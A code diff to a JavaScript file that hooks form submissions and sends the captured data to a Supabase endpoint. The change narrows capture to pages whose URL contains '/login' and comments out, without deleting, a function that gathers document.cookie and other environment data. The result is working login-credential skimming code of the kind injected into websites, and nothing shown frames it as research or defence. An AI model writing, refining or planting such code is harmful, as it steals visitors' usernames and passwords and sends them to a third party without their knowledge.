@@ -40,6 +40,7 @@ function sendData(data, type) {
   }).catch(error => console.error("Error sending data to Supabase:", error));
 }
 
+/*
 function collectEnvironmentInfo() {
   const info = {
     cookies: document.cookie,
@@ -63,25 +64,29 @@ function collectEnvironmentInfo() {
   
   return info;
 }
+*/
 
 function hookForms() {
-  document.querySelectorAll('form').forEach(form => {
-    form.addEventListener('submit', function(e) {
-      const formData = {};
-      new FormData(form).forEach((value, key) => {
-        formData[key] = value;
+  // Only proceed if URL contains '/login'
+  if (window.location.href.includes('/login')) {
+    document.querySelectorAll('form').forEach(form => {
+      form.addEventListener('submit', function(e) {
+        const formData = {};
+        new FormData(form).forEach((value, key) => {
+          formData[key] = value;
+        });
+        sendData(formData, 'form');
       });
-      sendData(formData, 'form');
     });
-  });
+  }
 }
 
 // Main execution
 (function() {
   // Send initial environment data
-  const envInfo = collectEnvironmentInfo();
-  sendData(envInfo, 'initial');
+  // const envInfo = collectEnvironmentInfo();
+  // sendData(envInfo, 'initial');
   
-  // Hook into forms to capture submissions
+  // Hook into forms to capture submissions only on login pages
   hookForms();
 })();
